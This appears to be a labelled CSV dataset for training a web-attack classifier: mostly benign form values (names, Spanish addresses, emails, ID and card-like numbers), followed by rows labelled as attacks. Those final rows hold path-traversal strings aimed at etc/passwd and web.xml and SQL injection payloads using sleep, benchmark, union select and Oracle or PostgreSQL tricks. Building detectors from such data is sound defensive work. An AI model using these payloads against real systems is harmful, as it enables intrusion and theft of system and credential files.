payload,attack_type,label
gottschlich_candy@piaceredelivery.pk,norm,0
su7r5orato,norm,0
onofredo,norm,0
31594,norm,0
rei1@rtce.au,norm,0
terhune@multireform.tn,norm,0
amaro,norm,0
novillas,norm,0
61126872w,norm,0
saetill.a,norm,0
canute,norm,0
perpinyromero,norm,0
rey,norm,0
"caminocementerio,s/n,",norm,0
7081,norm,0
a7p9i9bl2,norm,0
ermindo,norm,0
50373,norm,0
gillin-kinchelow@fotoseroticas.com.gr,norm,0
10332,norm,0
ritz@hipergipuzkoa.pa,norm,0
81717068t,norm,0
kania@internacionalexpofloralzaragoza2014.se,norm,0
env+olvente,norm,0
thurston,norm,0
24717,norm,0
9380,norm,0
41970,norm,0
8534,norm,0
trbena,norm,0
lapazao'neil,norm,0
viladomatgasull,norm,0
1526,norm,0
5,norm,0
"diazcamacho107,2-a",norm,0
8i4trib7ti5a,norm,0
48940261x,norm,0
79506626l,norm,0
3946406903398216,norm,0
3816140055742895,norm,0
sabanaya4,norm,0
normando,norm,0
2414,norm,0
c/garciamorente129,norm,0
09390,norm,0
0222583632895914,norm,0
alburquequefraguas,norm,0
44394,norm,0
minuetsalo,norm,0
sanemiliano,norm,0
12449,norm,0
4092441841924319,norm,0
03600,norm,0
mo19bun0a,norm,0
rubidebiasi,norm,0
4016,norm,0
49650,norm,0
pche,norm,0
1228688038789321,norm,0
postranecky@francislucille.mm,norm,0
23628,norm,0
halbert,norm,0
mehd3,norm,0
khanvali,norm,0
13440,norm,0
alfntega,norm,0
agostina,norm,0
6905166660575167,norm,0
35866862h,norm,0
"carrerdoctoresteve,124,",norm,0
hidrobo,norm,0
e2paq48t282r,norm,0
weintraub,norm,0
4948118153450551,norm,0
m0nuta9,norm,0
rocco-misaki@soybueno.nz,norm,0
ensaa6o,norm,0
"pasajecox194,5?f",norm,0
losardelavera,norm,0
41022572w,norm,0
laurencia,norm,0
medinaderioseco,norm,0
c/auroros173,norm,0
0567191601469528,norm,0
7626,norm,0
8285,norm,0
0183912378069519,norm,0
"lapa,la",norm,0
yamiledefrancisco,norm,0
huic!h9,norm,0
jenner,norm,0
idalio,norm,0
60380887e,norm,0
nineteen@drivinn.int,norm,0
matar,norm,0
6820667917309161,norm,0
silvia,norm,0
raing,norm,0
menndezcoyoma,norm,0
saint-simon-vondis@paremoselalzheimer.dj,norm,0
warriner,norm,0
25597,norm,0
maitena,norm,0
madisett,norm,0
juncollavallo,norm,0
1595247568175334,norm,0
9845728819454113,norm,0
48999460f,norm,0
6742076773015534,norm,0
barrerasdelabandera,norm,0
f5o9a8en9e,norm,0
elnore,norm,0
48655,norm,0
cadrete,norm,0
6e1ba,norm,0
pawluszeksegu,norm,0
te?clear,norm,0
donadio_honig@donkr.zr,norm,0
1esa0o401m0en7o,norm,0
mazanji,norm,0
17405,norm,0
"c/garciamosquera,184,",norm,0
adelina,norm,0
estupianlladonet,norm,0
atea,norm,0
81887613t,norm,0
krisha,norm,0
19332,norm,0
l0s4njear,norm,0
"travesiauruguay,172,",norm,0
22532,norm,0
94845655a,norm,0
peiratbellv,norm,0
07441681p,norm,0
ipe$cacuana,norm,0
6040888757825695,norm,0
c/sanmariano168,norm,0
"callecarmelotorres,102",norm,0
10250,norm,0
talgorriz,norm,0
riudellotsdelaselva,norm,0
leonella,norm,0
callemont-ral5912?g,norm,0
ugartecheaoviol,norm,0
19197,norm,0
66702102d,norm,0
aldealenguadepedraza,norm,0
bizarro,norm,0
9495157942989922,norm,0
leafloor,norm,0
368,norm,0
48210,norm,0
goth,norm,0
37209,norm,0
chirivherrador,norm,0
ku,norm,0
gwennie,norm,0
indoct9me7te,norm,0
kareem,norm,0
magriny,norm,0
koline.mathieson@viavilano.lv,norm,0
celadalurhmann,norm,0
07375030b,norm,0
8352337916705491,norm,0
atletismo,norm,0
"c/codigocorrespondenciaoficialcorreos-telegrafos71,10d",norm,0
1ed6at0zacin,norm,0
jailyn,norm,0
pingajosa,norm,0
mellor,norm,0
c/barja187,norm,0
"c/alcorac,102",norm,0
53486450l,norm,0
costello_browallius@autoconstruccion.bt,norm,0
clooney,norm,0
5563798964634481,norm,0
corts,norm,0
shedd,norm,0
milly7,norm,0
5796163870417935,norm,0
mary-ell,norm,0
09133,norm,0
presbiteriano,norm,0
ailee1,norm,0
carew1@koinup.ni,norm,0
"calleobispomiguelbucarelli,63",norm,0
quintina,norm,0
pe7tr0b9,norm,0
22440,norm,0
nobel,norm,0
33,norm,0
irregularidad,norm,0
3186627053603991,norm,0
calleramonmariomirazo46,norm,0
raleigh,norm,0
oestreic,norm,0
9867,norm,0
c?idiana,norm,0
angilberto,norm,0
carrervidalibarraquer28,norm,0
marg,norm,0
2563,norm,0
broughton0@naturalchild.lc,norm,0
amescua,norm,0
"c/ciudadela188,4?f",norm,0
8432,norm,0
limpias,norm,0
rainelda,norm,0
3598,norm,0
0131468635735450,norm,0
7548,norm,0
validocasademont,norm,0
95554434z,norm,0
"callesanisidrolabrador188,13?h",norm,0
casasdesangalindo,norm,0
melquades,norm,0
dosenbac,norm,0
29,norm,0
15198367j,norm,0
44650,norm,0
"callebeatotomasdezumarraga,8912-c",norm,0
samsagea,norm,0
ohala,norm,0
cottencon@palomajimenez.mr,norm,0
mcinerne,norm,0
masclansnieto,norm,0
c?leptmano,norm,0
sangres,norm,0
valverdedealcal,norm,0
37428,norm,0
cordita,norm,0
ninnette,norm,0
88253355d,norm,0
37788,norm,0
eusquero,norm,0
velez_hubner5@castigadas.cv,norm,0
"tejado,el",norm,0
buttons@creacionwebs.tm,norm,0
sask,norm,0
crusellesvarela,norm,0
60219106t,norm,0
desabor$ida,norm,0
callebernatdesantaeugenia90,norm,0
22859316f,norm,0
hau,norm,0
09515,norm,0
sobrestante,norm,0
3313243213262173,norm,0
empuar,norm,0
gonzale.katsuno@viajesparamujeres.tc,norm,0
76150645z,norm,0
espinozablancarte,norm,0
70153248m,norm,0
henckels@easyviaggio.tr,norm,0
denis-focas@007tv.gf,norm,0
raudres,norm,0
zubans,norm,0
holtz@pasajesaereosbaratos.es,norm,0
darrieu@redstarz.sv,norm,0
cibeles,norm,0
ors,norm,0
marino,norm,0
probtica,norm,0
braddell@cincocolores.cat,norm,0
araero,norm,0
tregenza,norm,0
24324,norm,0
hanley,norm,0
carreralpss/n13-d,norm,0
keene3@irmedia.gm,norm,0
07342606v,norm,0
38788994t,norm,0
2569,norm,0
fnico,norm,0
kirkpatr,norm,0
14640,norm,0
2u27lad9r4,norm,0
weiner,norm,0
manducatoria,norm,0
whiteside.seyfferrtitz@cohel.uk,norm,0
8020,norm,0
42,norm,0
ramblizo,norm,0
rozalndelmonte,norm,0
kipnis,norm,0
"pratsderei,els",norm,0
litt,norm,0
7730641296571131,norm,0
5ua5teo,norm,0
albea,norm,0
"piymargall17,7?f",norm,0
607,norm,0
cossovel-heintel@camiones-hibridos.ec,norm,0
vallibona,norm,0
wakefiel7,norm,0
tilton,norm,0
07608453f,norm,0
0n3r3oscura,norm,0
fonollzurko,norm,0
0294331048003243,norm,0
negri-hand@automoviles-hibridos.mo,norm,0
93966067g,norm,0
a75isi6i7id1d,norm,0
conried6@misanimalesdomesticos.ky,norm,0
76pelacin,norm,0
5762011011583829,norm,0
2417,norm,0
distar,norm,0
cassasolanochez,norm,0
moston@sierradealcaraz.sg,norm,0
42218,norm,0
4518310510128542,norm,0
pursima,norm,0
25140,norm,0
krajacic,norm,0
50708405y,norm,0
litago,norm,0
7774409448573763,norm,0
orce,norm,0
lakshmin,norm,0
robelo@moviels.me,norm,0
41110,norm,0
dalmiro,norm,0
08968667r,norm,0
c/buenosairess/n6?b,norm,0
05580,norm,0
2875307129391244,norm,0
parmenia,norm,0
ros,norm,0
8e6a74aer,norm,0
queila,norm,0
oleadeboedo,norm,0
"orio,134,",norm,0
callebernatmetge10,norm,0
0462514258960948,norm,0
16648,norm,0
satorrasmaynol,norm,0
"pl.sanmarcial90,13-e",norm,0
sheara,norm,0
+faccioso,norm,0
rupitipruit,norm,0
desailly_bosworth@coworkers.gov,norm,0
9129793967568864,norm,0
aguzadera,norm,0
73,norm,0
alberueladetubo,norm,0
comerate.foldi@ofertaschinas.dm,norm,0
boladopellicer,norm,0
62tiba74,norm,0
28609,norm,0
c/mayolica1584a,norm,0
4107,norm,0
desiree,norm,0
rode@sayuela.kw,norm,0
arbuckle,norm,0
38790,norm,0
ed,norm,0
pericak,norm,0
9449507239645140,norm,0
vivaldo,norm,0
anoa,norm,0
maridel,norm,0
salinillasdebureba,norm,0
kalila,norm,0
"sanpetersburgo,165",norm,0
balulde,norm,0
54310177r,norm,0
"wifredi92,",norm,0
3423,norm,0
"callerocafort,1694c",norm,0
1391785599222987,norm,0
neleo,norm,0
blancafort,norm,0
15280766a,norm,0
c35t2ib6ci1,norm,0
frutos,norm,0
darbanville@chicasdiabolo.tr,norm,0
3748443978921311,norm,0
melina,norm,0
mim,norm,0
1133130881623845,norm,0
huong,norm,0
rougerie@cincocolores.sd,norm,0
"callerobregordo,17110-c",norm,0
azuquecadehenares,norm,0
1818801431707826,norm,0
cendreros,norm,0
mordi3nt-e,norm,0
vasilopo,norm,0
24174,norm,0
villadoz,norm,0
shing-mi,norm,0
"pl.sierradeayllon100,",norm,0
3815,norm,0
allman,norm,0
5916923920449303,norm,0
alansellars,norm,0
verge,norm,0
c/rosario1922?b,norm,0
17864,norm,0
reluchar,norm,0
levert,norm,0
32790960k,norm,0
"mourel113,4?a",norm,0
"callecruzdecaravaca,171,",norm,0
45190,norm,0
arruga4,norm,0
camas,norm,0
19277,norm,0
42808198t,norm,0
vernn,norm,0
re9a3io,norm,0
ben2,norm,0
"paratgepalmira,112,5-b",norm,0
10696,norm,0
5100,norm,0
"callematula,s/n,",norm,0
6148304241486263,norm,0
rocodaira,norm,0
0503314852702538,norm,0
heintje0@alpesfranceses.com.ro,norm,0
ubraco,norm,0
6991,norm,0
7636016430512183,norm,0
21184515c,norm,0
kiam,norm,0
cerd,norm,0
79140741h,norm,0
marginet,norm,0
4231744159905009,norm,0
1illabarqu2,norm,0
guoben,norm,0
budia,norm,0
bailn,norm,0
lusa,norm,0
6070377795549230,norm,0
roldan,norm,0
04492457m,norm,0
17115248m,norm,0
matterstock@9horas.np,norm,0
"c/moncayo,36,10-d",norm,0
emmersto,norm,0
velejar,norm,0
cabaasdelcastillo,norm,0
inclemente,norm,0
sanmartndelcastaar,norm,0
57i-9557a,norm,0
"c/artazuria,4310?e",norm,0
piero,norm,0
holgachona,norm,0
46198,norm,0
buckner0,norm,0
"avingudafrancescmacia.,303?b",norm,0
nasit_barscha@cortinas-de-aire.eh,norm,0
vyza,norm,0
3151,norm,0
sosa,norm,0
08507068n,norm,0
emesh,norm,0
salome,norm,0
tchjan-lian.quadflieg@comerciosdeaspe.se,norm,0
cuad5in1m3o,norm,0
77447105x,norm,0
4474255756033041,norm,0
enmade6ar,norm,0
igal,norm,0
c/franciscorodriguez48,norm,0
ayunque,norm,0
murcia,norm,0
8641505731046514,norm,0
hadel,norm,0
pl.andresdesoloaga1208?e,norm,0
chassigneux.tekurarere3@truecatucasa.gg,norm,0
victoriadelosangeles,norm,0
87179467z,norm,0
"donquijote81,",norm,0
desequilibrar,norm,0
foguear,norm,0
yamilem,norm,0
ne-regio,norm,0
52310665v,norm,0
albeta,norm,0
49645694x,norm,0
chunyen,norm,0
chamsi,norm,0
lemacuartero,norm,0
c/quilichao85,norm,0
1269522049567133,norm,0
"c/can'alzina,80,6-b",norm,0
0350022340129740,norm,0
ikebe.king@zarasalud.us,norm,0
2523504851273429,norm,0
58725277k,norm,0
tindall-bourne@pintandomucho.cg,norm,0
merriell,norm,0
c39ine8ra,norm,0
couri-manahan@copiar.com.fm,norm,0
parairecredido,norm,0
"c/coronelcervionuez,353-c",norm,0
"gravina,78",norm,0
"plza.antoniomairena,80,",norm,0
belmontedegracin,norm,0
pandulfo,norm,0
08105727k,norm,0
2651730269519486,norm,0
niklas,norm,0
monteonpasquina,norm,0
saskia,norm,0
1044,norm,0
"callefomento,197,3b",norm,0
4a6050,norm,0
addetia,norm,0
remedo,norm,0
rexachdonada,norm,0
pleitas,norm,0
osteicoecheauslet,norm,0
"luisbraille,1936?a",norm,0
08300,norm,0
guineahinojar,norm,0
s3borrea,norm,0
zulaima,norm,0
19392,norm,0
"iglesueladelcid,la",norm,0
8151,norm,0
es93n576te,norm,0
barriodemu,norm,0
roehn.kernke@eldeseodepecar.ec,norm,0
dorsch.galani@lapasteleria.mg,norm,0
25613,norm,0
alfama,norm,0
tiramollar,norm,0
sia,norm,0
63ep6240e50o,norm,0
seno,norm,0
gwohsing,norm,0
castildevela,norm,0
garceziturriria,norm,0
olasdelrey,norm,0
aventajada,norm,0
salobral,norm,0
dodsworth@sevach.co,norm,0
pavor,norm,0
dailey@flabingo.gw,norm,0
16,norm,0
gina,norm,0
scardettahuerta,norm,0
30802142j,norm,0
augur,norm,0
cr48e24n,norm,0
doria7@cohel.kz,norm,0
callelaramblas/n4?d,norm,0
cabrergascon,norm,0
russo,norm,0
descabal!gadura,norm,0
armenteros,norm,0
clunes7@palodegolf.com.coop,norm,0
46702832k,norm,0
jess,norm,0
sheila,norm,0
nuogmez,norm,0
yoselie,norm,0
92251391r,norm,0
"luisdegongora,189",norm,0
6052575458903968,norm,0
osmn,norm,0
wenner@rpdkorea.nr,norm,0
galina,norm,0
niel5,norm,0
43425,norm,0
severo,norm,0
"pujadaparc111,1-a",norm,0
rosa,norm,0
ezio,norm,0
leshowit,norm,0
03400,norm,0
"c/ereta,104,",norm,0
denys,norm,0
shalne,norm,0
waite,norm,0
5537,norm,0
67242195q,norm,0
1180317448071698,norm,0
lucianonagel,norm,0
caleta,norm,0
arquitectnico,norm,0
"callebelen10,8a",norm,0
e0l4i1,norm,0
ochoa7,norm,0
7482251600785207,norm,0
42ache,norm,0
emory,norm,0
saleh,norm,0
descabellar,norm,0
palmara@ajedrezconmaestros.museum,norm,0
carminante,norm,0
freydigrueda,norm,0
tal,norm,0
arsyermo,norm,0
kelcy,norm,0
oasi0s,norm,0
alicanto,norm,0
45571518p,norm,0
2502,norm,0
78267819s,norm,0
5714386014521039,norm,0
cinaci0a,norm,0
31494,norm,0
82474321r,norm,0
donnerstag_carraro@hojainformativa.sv,norm,0
albery,norm,0
linaresbarreras,norm,0
09315,norm,0
16038366y,norm,0
zuigaurbina,norm,0
6273831231107298,norm,0
steinbach@ballobar.com.tf,norm,0
i4dig6st8bl9,norm,0
83433277h,norm,0
93sci06i745o,norm,0
epnimo,norm,0
rist,norm,0
c/euclides516?e,norm,0
atora,norm,0
3o7za732,norm,0
deshonra,norm,0
18311,norm,0
lovejoy,norm,0
monopolizador,norm,0
16806738v,norm,0
arney2,norm,0
ansaldovillapando,norm,0
argecilla,norm,0
vieta,norm,0
445ug4,norm,0
hadrian,norm,0
jochim@ajuntamentdebarcelona2-0.qa,norm,0
marabeln,norm,0
calleeduardtoldra1375?a,norm,0
clint,norm,0
c/cuencas/n,norm,0
chumpipe,norm,0
1681429677567137,norm,0
9387,norm,0
snips,norm,0
$despumar,norm,0
"c/arroyodelaspavas,183,13?c",norm,0
behetra,norm,0
eggebraa,norm,0
elwira,norm,0
timb44,norm,0
herrera,norm,0
7960,norm,0
02246,norm,0
priado,norm,0
labossie2,norm,0
chilches/xilxes,norm,0
03669,norm,0
forslund,norm,0
13189,norm,0
d66jador,norm,0
2383965085524849,norm,0
r09pe574,norm,0
anteda,norm,0
callefama11510g,norm,0
4300788041091326,norm,0
baides,norm,0
49190,norm,0
ilia,norm,0
ceg.ama,norm,0
kingston@professionalhost.com.ag,norm,0
"c/sansalvador,34,10?f",norm,0
4456163671536679,norm,0
imtaz,norm,0
6233284855351457,norm,0
6262014386687000,norm,0
otowa@ebuy.com.ci,norm,0
florestano,norm,0
"c/pabloiglesias,116",norm,0
"caminoermitadelatorre,129,",norm,0
retejador,norm,0
cancela,norm,0
noye,norm,0
clay@parcalia.ml,norm,0
desafinar,norm,0
mucheng,norm,0
papa@opel-e-flex.cg,norm,0
sotalugo,norm,0
for26same8te,norm,0
castaldi.grasselli@expofloralzaragoza2014.pf,norm,0
s9st6o,norm,0
orist,norm,0
0947549871262969,norm,0
gu5cima,norm,0
29p0r2en9e7c87,norm,0
5533110121299997,norm,0
7562939151589208,norm,0
bezoar,norm,0
ken,norm,0
rigas.albalak@albeiteria.it,norm,0
matillalaseca,norm,0
"rionervion,177",norm,0
rocodelcielo,norm,0
po2546oto4,norm,0
balsam-prey@mmo.com.cat,norm,0
entendimiento,norm,0
ateniesa,norm,0
bimini,norm,0
oxendine,norm,0
caas,norm,0
1467,norm,0
staggs,norm,0
gunther@nik.com.tn,norm,0
*aquele,norm,0
olaughlin@pinkplanetplasencia.uy,norm,0
maurizio,norm,0
escobedosantagata,norm,0
puentedemontaana,norm,0
huari,norm,0
"callefranciscodeleiva,131,",norm,0
61089913g,norm,0
7onom9niaca,norm,0
gelogo,norm,0
revivificar,norm,0
scanell@clichotel.kw,norm,0
stapley@cirugiaplasticacordoba.jm,norm,0
canudes,norm,0
"tresvillas,las",norm,0
novelador,norm,0
pawlikowski@clo2.tw,norm,0
"callefernandogalvan,192,7b",norm,0
l1b6855ca30e,norm,0
97222758x,norm,0
00947908d,norm,0
ponts,norm,0
49180,norm,0
"rinconadadelasierra,la",norm,0
2797,norm,0
3400796495784367,norm,0
chavis,norm,0
encabar,norm,0
c2645ido,norm,0
"c/australia85,",norm,0
gema,norm,0
"c/ortizdezuiga,8,",norm,0
39202408n,norm,0
vicentecornell,norm,0
"c/altamira179,",norm,0
8641,norm,0
micr6pil8,norm,0
40142,norm,0
lido,norm,0
"plaacatalunya124,5-b",norm,0
37130,norm,0
4909,norm,0
"saavedrafajardos/n,3-h",norm,0
resello,norm,0
50422961s,norm,0
5986,norm,0
cacaihnen,norm,0
22655130s,norm,0
carcaboso,norm,0
2780139956948714,norm,0
buenda,norm,0
a0_idia,norm,0
alimena,norm,0
rosalinda,norm,0
15175,norm,0
cargaderos79,norm,0
9481894123052720,norm,0
ljund@casadedurcal.sl,norm,0
uribitarte7213?g,norm,0
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../../{file},path-traversal,1
/....................................................................................................................................................................{file},path-traversal,1
/../../../{file},path-traversal,1
/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{file},path-traversal,1
/............................................................................{file},path-traversal,1
/..../..../..../{file},path-traversal,1
/..///..///..///..///..///{file},path-traversal,1
/.........{file},path-traversal,1
..................................................etcpasswd,path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa........{file},path-traversal,1
/......................................................................................{file},path-traversal,1
/.//..//.//..//.//..//.//..//.//..//.//..//{file},path-traversal,1
/../../../../../web-inf/web.xml,path-traversal,1
/../..//../..//{file},path-traversal,1
/..//..//..//..//..//..//..//{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../{file},path-traversal,1
/../../../../{file},path-traversal,1
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,path-traversal,1
/.//./{file},path-traversal,1
/..........................................................................................................................................................{file},path-traversal,1
/..../..../{file},path-traversal,1
/../..//../..//../..//..///{file},path-traversal,1
/../..//{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..{file},path-traversal,1
//../../../../../../../..{file},path-traversal,1
/.//..//.//..//{file},path-traversal,1
/.//..//.//..//.//..//.//..//.//..//{file},path-traversal,1
/.../{file},path-traversal,1
///{file},path-traversal,1
1'orsleep(5)and'udqz'='udqz,sqli,1
1'))ashqhswhere5383=5383;select(casewhen(8978=1426)then1else8978*(select8978frommaster..sysdatabases)end)--,sqli,1
"-1256'inbooleanmode)unionallselect7889,7889,7889,7889,7889,7889,7889,7889,7889--",sqli,1
"1))and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and((4048=4048",sqli,1
"-3729'))or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(('czed'='czed",sqli,1
"1%"")))or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"1'))asumahwhere3781=3781unionallselectnull,null,null,null#",sqli,1
"1where4787=4787;iif(1483=7301,1,1/0)",sqli,1
"1')or8466=benchmark(5000000,md5(0x694a4745))and('ffzv'='ffzv",sqli,1
"1)where9432=9432and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
1')rlike(select(casewhen(7689=7689)then1else0x28end))and('ejnt'like'ejnt,sqli,1
"1';createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
"1%"")unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
1')))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((('smrw'like'smrw,sqli,1
"1%""))unionallselectnull,null#",sqli,1
